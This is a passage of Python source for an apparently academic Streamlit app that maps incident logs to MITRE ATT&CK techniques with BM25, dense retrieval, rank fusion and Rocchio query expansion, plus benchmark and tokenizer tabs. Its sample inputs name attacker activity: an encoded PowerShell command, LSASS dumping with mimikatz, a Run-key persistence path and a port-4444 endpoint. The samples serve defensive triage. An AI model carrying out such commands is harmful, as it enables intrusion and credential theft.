            "Rocchio Alpha (Original Query Weight)",
            min_value=0.1, max_value=2.0, value=float(st.session_state.get("sandbox_alpha", 1.0)), step=0.05,
            key="sandbox_alpha",
            help="Weight of the original user query vector."
        )
        box_beta = st.slider(
            "Rocchio Beta (Expansion Feedback Weight)",
            min_value=0.1, max_value=2.0, value=float(st.session_state.get("sandbox_beta", 0.75)), step=0.05,
            key="sandbox_beta",
            help="Weight assigned to pseudo-relevant feedback terms/documents."
        )
        box_k_docs = st.slider(
            "k_docs (Feedback Candidates Depth)",
            min_value=1, max_value=10, value=int(st.session_state.get("sandbox_k_docs", 3)), step=1,
            key="sandbox_k_docs",
            help="Number of Top first-pass documents considered relevant (D_r)."
        )
        box_num_terms = st.slider(
            "Expansion Terms Added",
            min_value=1, max_value=15, value=int(st.session_state.get("sandbox_num_terms", 5)), step=1,
            key="sandbox_num_terms",
            help="Number of candidate expansion terms added to reformulated query."
        )
        st.latex(r"\vec{q}_{\text{new}} = \alpha \vec{q}_0 + \frac{\beta}{|D_r|} \sum_{d \in D_r} \frac{1}{\sqrt{\text{rank}}} \cdot \vec{d}")

    # Update session state with sandbox parameters
    st.session_state["bm25_k1"] = box_k1
    st.session_state["bm25_b"] = box_b
    st.session_state["rrf_k"] = box_rrf_k
    st.session_state["prf_alpha"] = box_alpha
    st.session_state["prf_beta"] = box_beta
    st.session_state["prf_k_docs"] = box_k_docs
    st.session_state["prf_num_terms"] = box_num_terms

    # Reset callback to avoid StreamlitWidgetAlreadyInstantiatedError
    def reset_academic_defaults():
        st.session_state["sandbox_k1"] = 1.5
        st.session_state["sandbox_b"] = 0.75
        st.session_state["sandbox_rrf_k"] = 60
        st.session_state["sandbox_alpha"] = 1.0
        st.session_state["sandbox_beta"] = 0.75
        st.session_state["sandbox_k_docs"] = 3
        st.session_state["sandbox_num_terms"] = 5
        st.session_state["bm25_k1"] = 1.5
        st.session_state["bm25_b"] = 0.75
        st.session_state["rrf_k"] = 60
        st.session_state["prf_alpha"] = 1.0
        st.session_state["prf_beta"] = 0.75
        st.session_state["prf_k_docs"] = 3
        st.session_state["prf_num_terms"] = 5

    st.button(
        "🔄 Reset Parameters to Academic Defaults (k1=1.5, b=0.75, k=60, alpha=1.0, beta=0.75)",
        on_click=reset_academic_defaults,
        key="sandbox_reset_btn",
        use_container_width=False
    )

    st.markdown("---")
    st.subheader("⚡ Real-Time Parameter Impact Experimentation")
    st.caption("Observe how changing hyperparameters directly shifts rankings and score distributions compared to default baseline parameters.")

    sandbox_query = st.text_area(
        "Experiment Query:",
        height=70,
        key="sandbox_query_input",
        on_change=on_sandbox_query_change
    )

    if sandbox_query:
        # Run with default baseline parameters
        default_res = engine.search(
            query=sandbox_query,
            mode="hybrid_prf",
            top_k=5,
            bm25_k1=1.5,
            bm25_b=0.75,
            rrf_k=60,
            prf_alpha=1.0,
            prf_beta=0.75,
            prf_k_docs=3,
            prf_num_terms=5
        )

        # Run with customized sandbox parameters
        custom_res = engine.search(
            query=sandbox_query,
            mode="hybrid_prf",
            top_k=5,
            bm25_k1=box_k1,
            bm25_b=box_b,
            rrf_k=box_rrf_k,
            prf_alpha=box_alpha,
            prf_beta=box_beta,
            prf_k_docs=box_k_docs,
            prf_num_terms=box_num_terms
        )

        exp_col1, exp_col2 = st.columns(2)

        with exp_col1:
            st.markdown("#### 🏛️ Default Baseline (k1=1.5, b=0.75, k=60, α=1.0, β=0.75)")
            default_ranks = {r["id"]: r["rank"] for r in default_res["results"]}
            for r in default_res["results"]:
                t_id = r["id"]
                nm = r["name"]
                sc = r["score"]
                rk = r["rank"]
                st.markdown(f"""
                <div class="compare-card border-bm25">
                    <span class="badge-tag badge-tech-id">#{rk} | {t_id}</span>
                    <b style="color:#e2e8f0;">{nm}</b>
                    <div style="margin-top:6px; font-size:0.82rem; color:#94a3b8;">
                        Score: <b>{sc:.4f}</b>
                    </div>
                </div>
                """, unsafe_allow_html=True)

        with exp_col2:
            st.markdown(f"#### 🧪 Tuned Sandbox (k1={box_k1:.2f}, b={box_b:.2f}, k={box_rrf_k}, α={box_alpha:.2f}, β={box_beta:.2f})")
            for r in custom_res["results"]:
                t_id = r["id"]
                nm = r["name"]
                sc = r["score"]
                rk = r["rank"]
                old_rk = default_ranks.get(t_id)

                if old_rk is None:
                    shift_badge = '<span class="shift-tag shift-new">★ Newly Discovered in Top-5</span>'
                elif old_rk > rk:
                    shift_badge = f'<span class="shift-tag shift-up">▲ +{old_rk - rk} Ranks (was #{old_rk})</span>'
                elif old_rk < rk:
                    shift_badge = f'<span class="shift-tag shift-down">▼ {abs(old_rk - rk)} Ranks (was #{old_rk})</span>'
                else:
                    shift_badge = f'<span class="shift-tag shift-same">● Stable Rank (#{old_rk})</span>'

                st.markdown(f"""
                <div class="compare-card border-prf">
                    <span class="badge-tag badge-tech-id">#{rk} | {t_id}</span>
                    <b style="color:#e2e8f0;">{nm}</b>
                    <div style="margin-top:6px; font-size:0.82rem; color:#94a3b8;">
                        Score: <b>{sc:.4f}</b> | {shift_badge}
                    </div>
                </div>
                """, unsafe_allow_html=True)

        # Show PRF terms discovered under custom parameters
        c_prf = custom_res.get("prf_info")
        if c_prf and c_prf.get("expansion_terms"):
            st.markdown("##### Discovered Expansion Terms Under Tuned Sandbox:")
            chips = " ".join([f'<span class="badge-tag badge-score">+{t["term"]} (w={t["weight"]:.3f}, idf={t["idf"]:.2f})</span>' for t in c_prf["expansion_terms"]])
            st.markdown(chips, unsafe_allow_html=True)

# -------------------------------------------------------------
# TAB 3: INCIDENT TRIAGE & SEARCH
# -------------------------------------------------------------
with tab_triage:
    st.subheader("Automated Incident Log Triage")
    st.caption("Paste unstructured SOC alerts, endpoint telemetry, command lines, or threat descriptions to map them to MITRE techniques.")

    # 1-Click Examiner Demo Scenarios Bar
    render_examiner_demo_bar(prefix="triage")

    preset_choice = st.selectbox(
        "Quick Presets (Academic Scenarios):",
        list(INCIDENT_PRESETS.keys()),
        key="triage_preset_selectbox",
        on_change=on_triage_preset_change
    )

    query_input = st.text_area(
        "Incident Log / Telemetry Input:",
        height=95,
        placeholder="e.g. powershell.exe -enc payload.ps1 or Attacker dumped LSASS memory using mimikatz...",
        key="triage_query_input",
        on_change=on_triage_query_change
    )

    col_btn1, col_btn2 = st.columns([1, 4])
    with col_btn1:
        search_clicked = st.button("🚀 Triage Incident", type="primary", use_container_width=True)

    if query_input:
        st.session_state["global_query"] = query_input
        active_mode = mode_map[search_mode]
        with st.spinner(f"Executing {search_mode}..."):
            response = engine.search(
                query=query_input,
                mode=active_mode,
                top_k=top_k_slider,
                bm25_k1=st.session_state["bm25_k1"],
                bm25_b=st.session_state["bm25_b"],
                rrf_k=st.session_state["rrf_k"],
                prf_alpha=st.session_state["prf_alpha"],
                prf_beta=st.session_state["prf_beta"],
                prf_k_docs=st.session_state["prf_k_docs"],
                prf_num_terms=st.session_state["prf_num_terms"]
            )

        # Performance summary metrics
        st.markdown("### Triage Metrics")
        mcol1, mcol2, mcol3, mcol4 = st.columns(4)
        with mcol1:
            st.markdown(f"""
            <div class="stat-box">
                <div class="stat-val">{response['latency_ms']:.1f} ms</div>
                <div class="stat-label">Retrieval Latency</div>
            </div>
            """, unsafe_allow_html=True)
        with mcol2:
            st.markdown(f"""
            <div class="stat-box">
                <div class="stat-val">{len(response['results'])}</div>
                <div class="stat-label">Candidates Retrieved</div>
            </div>
            """, unsafe_allow_html=True)
        with mcol3:
            top_hit = response['results'][0]['id'] if response['results'] else "None"
            st.markdown(f"""
            <div class="stat-box">
                <div class="stat-val" style="color: #4ade80;">{top_hit}</div>
                <div class="stat-label">Top Identified Technique</div>
            </div>
            """, unsafe_allow_html=True)
        with mcol4:
            st.markdown(f"""
            <div class="stat-box">
                <div class="stat-val" style="color: #c084fc;">{search_mode.split()[0]}</div>
                <div class="stat-label">Active Strategy</div>
            </div>
            """, unsafe_allow_html=True)

        # Rocchio PRF Explanation Box if PRF was used
        if response.get("prf_info"):
            prf = response["prf_info"]
            with st.expander("✨ Rocchio Pseudo-Relevance Feedback (Query Expansion Breakdown)", expanded=True):
                st.markdown(f"**Original Query:** `{prf['original_query']}`")
                st.markdown(f"**Enriched Query ($Q_{{new}}$):** `{prf['expanded_query']}`")
                st.markdown(f"**Pseudo-Relevant Feedback Documents ($D_r$, Top-{prf['k_feedback']}):** " +
                            ", ".join([f"`{d_id}` ({name})" for d_id, name in zip(prf['feedback_doc_ids'], prf['feedback_doc_names'])]))

                st.markdown("**Top Discovered Expansion Terms (TF-IDF Arithmetic):**")
                chips_html = ""
                for term_info in prf["expansion_terms"]:
                    chips_html += f"""
                    <span class="badge-tag badge-score">
                        +{term_info['term']} (weight: {term_info['weight']:.3f}, IDF: {term_info['idf']:.2f})
                    </span>
                    """
                st.markdown(chips_html, unsafe_allow_html=True)
                st.caption(f"Formula applied: q_new = {prf['alpha']} * q_0 + ({prf['beta']} / {prf['k_feedback']}) * sum(d in D_r)")

        # Results Display
        st.markdown(f"### Ranked MITRE ATT&CK Techniques (Top-{top_k_slider})")

        for r in response["results"]:
            tech_id = r["id"]
            name = r["name"]
            score = r["score"]
            rank = r["rank"]
            tactics = r.get("tactics", [])
            platforms = r.get("platforms", [])
            desc = r.get("description", "")
            mitigations = r.get("mitigations", [])
            url = r.get("url", f"https://attack.mitre.org/techniques/{tech_id.replace('.', '/')}")
            matched_terms = r.get("matched_terms", [])
            superseded_from = r.get("superseded_from")

            tactic_badges = " ".join([f'<span class="badge-tag badge-tactic">{t}</span>' for t in tactics])
            platform_str = ", ".join(platforms) if platforms else "All"
            superseded_badge = f'<span class="badge-tag badge-danger">Superseded from {superseded_from}</span>' if superseded_from else ""

            # Rank breakdown string
            score_meta = ""
            if "rrf_score" in r:
                bm25_part = f"BM25 Rank: #{r.get('bm25_rank')} ({r.get('bm25_score', 0):.2f})" if r.get('bm25_rank') else "BM25: Not in top pool"
                dense_part = f"Dense Rank: #{r.get('dense_rank')} (Cos: {r.get('dense_score', 0):.3f})" if r.get('dense_rank') else "Dense: Not in top pool"
                score_meta = f"RRF Score: <b>{r['rrf_score']:.4f}</b> | {bm25_part} | {dense_part}"
            elif r.get("method") == "BM25":
                score_meta = f"Okapi BM25 Score: <b>{score:.4f}</b>"
            else:
                score_meta = f"Dense Cosine Similarity: <b>{score:.4f}</b>"

            matched_chips = " ".join([f'<span class="badge-tag badge-token">{t}</span>' for t in matched_terms]) if matched_terms else "Semantic Vector Match"

            st.markdown(f"""
            <div class="tech-card">
                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                    <div>
                        <span class="badge-tag badge-tech-id">#{rank} | {tech_id}</span>
                        {superseded_badge}
                        <a href="{url}" target="_blank" style="color: #38bdf8; font-size: 1.2rem; font-weight: 700; text-decoration: none;">
                            {name} ↗
                        </a>
                        <div style="margin-top: 6px;">{tactic_badges}</div>
                    </div>
                    <div style="text-align: right;">
                        <span class="badge-tag badge-score">Score: {score:.4f}</span>
                        <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 4px;">Platforms: {platform_str}</div>
                    </div>
                </div>
                <div style="margin-top: 10px; font-size: 0.85rem; color: #cbd5e1;">
                    {score_meta}
                </div>
                <div style="margin-top: 8px; font-size: 0.83rem; color: #94a3b8;">
                    <b>Matched Entities:</b> {matched_chips}
                </div>
                <p style="margin-top: 12px; font-size: 0.92rem; color: #e2e8f0; line-height: 1.5;">
                    {desc[:350]}...
                </p>
            </div>
            """, unsafe_allow_html=True)

            # Mitigations & BM25 Explainability Accordion
            with st.expander(f"🛡️ Defense Recommendations & Math Attribution for {tech_id}"):
                c1, c2 = st.columns([3, 2])
                with c1:
                    st.markdown(f"#### Official Mitigations ({len(mitigations)} Available)")
                    if mitigations:
                        for m in mitigations[:4]:
                            st.markdown(f"**`{m['id']}` - {m['name']}**")
                            st.caption(m["description"][:300] + ("..." if len(m["description"]) > 300 else ""))
                    else:
                        st.info("No specific direct course of action recorded. Follow general system hardening guidelines.")

                with c2:
                    st.markdown("#### BM25 Component Attribution")
                    expl = engine.explain_bm25(query_input, tech_id, k1=st.session_state["bm25_k1"], b=st.session_state["bm25_b"])
                    if "terms" in expl:
                        # Show non-zero matching terms first, followed by remaining
                        matching_terms = [t for t in expl["terms"] if t["tf"] > 0]
                        display_terms = matching_terms if matching_terms else expl["terms"]
                        term_rows = []
                        for t_info in display_terms:
                            term_rows.append({
                                "Term": t_info["term"],
                                "TF": t_info["tf"],
                                "DF": t_info["df"],
                                "IDF": t_info["idf"],
                                "BM25 Contrib": t_info["score_contribution"]
                            })
                        st.dataframe(pd.DataFrame(term_rows), use_container_width=True, hide_index=True)
                    st.caption(f"Doc Length: {expl.get('doc_length')} | AvgDocLen: {expl.get('avg_doc_length')} | k1={expl.get('k1')}, b={expl.get('b')}")

# -------------------------------------------------------------
# TAB 4: CYBER REGEX TOKENIZER INSPECTOR
# -------------------------------------------------------------
with tab_tokenizer:
    st.subheader("CyberRegexTokenizer vs Standard NLP Tokenizer")
    st.caption("Demonstrating why standard tokenizers (SpaCy/NLTK/Porter) fail on CTI and how domain regex patterns preserve critical Indicators of Compromise (IoCs).")

    test_sample = st.text_area(
        "Input text containing technical cyber artifacts:",
        value="Adversary executed powershell.exe -enc aW1wb3J0 invoking T1059.001 and CVE-2023-38606 at HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with C:\\Windows\\System32\\cmd.exe and 192.168.1.100:4444 /v /add",
        height=90
    )

    if test_sample:
        comparison = engine.compare_tokenization(test_sample)

        tcol1, tcol2, tcol3 = st.columns(3)
        with tcol1:
            st.metric("Technical Entities Detected", comparison["technical_entities_count"])
        with tcol2:
            st.metric("Corrupted by Standard NLP", len(comparison["corrupted_by_standard"]))
        with tcol3:
            pres_pct = comparison["preservation_rate"] * 100
            st.metric("IoC Preservation Rate", f"{pres_pct:.1f}%")

        if comparison["corrupted_by_standard"]:
            st.warning(
                f"⚠️ Standard NLP tokenizers corrupted or stripped {len(comparison['corrupted_by_standard'])} critical cyber entities: " +
                ", ".join([f"`{c}`" for c in comparison["corrupted_by_standard"]])
            )

        col_cyb, col_std = st.columns(2)
        with col_cyb:
            st.markdown("#### ✅ ThreatMatch CyberRegexTokenizer")
            st.caption("Preserves Technique IDs, CVEs, Flags, Processes, Registry Paths intact.")
            detailed_data = []
            for item in comparison["cyber_detailed"]:
                detailed_data.append({
                    "Token": item["value"],
                    "Entity Category": item["type"],
                    "Is Technical IoC": "🔒 Yes" if item["technical"] else "No"
                })
            st.dataframe(pd.DataFrame(detailed_data), use_container_width=True)

        with col_std:
            st.markdown("#### ❌ Standard NLP Tokenizer (`\\w+` + Punctuation Stripping)")
            st.caption("Splits IDs, loses leading hyphens/slashes, strips registry hives.")
            st.write(comparison["standard_tokens"])

# -------------------------------------------------------------
# TAB 5: BENCHMARKING & IR METRICS
# -------------------------------------------------------------
with tab_benchmark:
    st.subheader("System Benchmarking & IR Evaluation Suite")
    st.caption("Standardized test suite of 25 realistic incident scenarios mapped to ground-truth ATT&CK techniques. Comparing all 4 retrieval baselines.")

    if benchmark_data and "summary_table" in benchmark_data:
        summary_df = pd.DataFrame(benchmark_data["summary_table"])

        st.markdown("#### Comparative Baseline Performance")
        st.dataframe(
            summary_df.style.highlight_max(subset=["MAP", "NDCG@10", "MRR", "P@1", "P@5", "Recall@10"], color="#065f46")
                            .highlight_min(subset=["Latency (ms)"], color="#1e3a8a"),
            use_container_width=True
        )

        st.markdown("#### Metric Visualizations")
        chart_cols = st.columns(3)
        with chart_cols[0]:
            st.bar_chart(summary_df.set_index("Strategy")["MAP"], color="#38bdf8")
            st.caption("Mean Average Precision (MAP)")
        with chart_cols[1]:
            st.bar_chart(summary_df.set_index("Strategy")["NDCG@10"], color="#4ade80")
            st.caption("NDCG@10 (Normalized Discounted Cumulative Gain)")
        with chart_cols[2]:
            st.bar_chart(summary_df.set_index("Strategy")["MRR"], color="#c084fc")
            st.caption("Mean Reciprocal Rank (MRR)")

        # Per-Query Breakdown Explorer
        st.markdown("---")
        st.subheader("Query-by-Query Evaluation Breakdown (25 Scenarios)")
        selected_strategy = st.selectbox(
            "Inspect Query Performance for Strategy:",
            ["hybrid", "hybrid_prf", "bm25", "dense"],
            index=0
        )

        strat_details = benchmark_data["details"][selected_strategy]["query_details"]
        strat_df = pd.DataFrame(strat_details)
        st.dataframe(strat_df[["query_id", "category", "query", "ground_truth", "top_hit_id", "top_hit_name", "rr", "ndcg10", "p5", "latency_ms"]], use_container_width=True)

    else:
        st.info("Run `python scripts/run_benchmark.py` to generate the benchmark metrics.")

    st.markdown("---")
    st.markdown("### Mumbai University Syllabus Alignment (CSDC 7023)")
    s1, s2, s3, s4 = st.columns(4)
    with s1:
        st.markdown("**1. Preprocessing & Inverted Index**")
        st.caption("CyberRegex tokenizer, stop-word bypass for IoCs, document frequency and term frequency tracking.")
    with s2:
        st.markdown("**2. Probabilistic & Vector Models**")
        st.caption("Okapi BM25 sparse matching alongside 384-d dense embeddings and FAISS index.")
    with s3:
        st.markdown("**3. Relevance Feedback**")
        st.caption("Rocchio Pseudo-Relevance Feedback (PRF) vector arithmetic for automatic query expansion.")
    with s4:
        st.markdown("**4. Retrieval Evaluation**")
        st.caption("MAP, NDCG@10, MRR, Precision@k, Recall@k benchmarking over 25 standardized scenarios.")

# -------------------------------------------------------------
# TAB 6: MITRE ATT&CK CORPUS EXPLORER
# -------------------------------------------------------------
with tab_corpus:
    st.subheader("MITRE ATT&CK Enterprise Corpus Explorer")
    st.caption("Browse all 858 indexed enterprise techniques, sub-techniques, and security mitigations.")

    filter_col1, filter_col2 = st.columns(2)
    all_tactics = ["All Tactics"] + sorted(list(set([t for tech in engine.techniques for t in tech.get("tactics", [])])))
    all_platforms = ["All Platforms", "Windows", "Linux", "macOS", "Cloud", "Network"]

    with filter_col1:
        chosen_tactic = st.selectbox("Filter by Tactic:", all_tactics)
    with filter_col2:
        chosen_platform = st.selectbox("Filter by Platform:", all_platforms)

    search_filter = st.text_input("Filter techniques by name or ID:", "")

    filtered = engine.techniques
    if chosen_tactic != "All Tactics":
        filtered = [t for t in filtered if chosen_tactic in t.get("tactics", [])]
    if chosen_platform != "All Platforms":
        filtered = [t for t in filtered if any(chosen_platform.lower() in p.lower() for p in t.get("platforms", []))]
    if search_filter:
        s_lower = search_filter.lower()
        filtered = [t for t in filtered if s_lower in t["id"].lower() or s_lower in t["name"].lower()]

    st.markdown(f"**Showing {len(filtered)} techniques:**")
    display_rows = []
    for t in filtered[:100]:
        display_rows.append({
            "Technique ID": t["id"],
            "Name": t["name"],
            "Tactics": ", ".join(t.get("tactics", [])),
            "Platforms": ", ".join(t.get("platforms", [])),
            "Mitigations Count": len(t.get("mitigations", [])),
            "Sub-technique": "Yes" if t.get("is_subtechnique") else "No"
        })
    st.dataframe(pd.DataFrame(display_rows), use_container_width=True)
    if len(filtered) > 100:
        st.caption(f"Display capped at first 100 of {len(filtered)} matching techniques.")
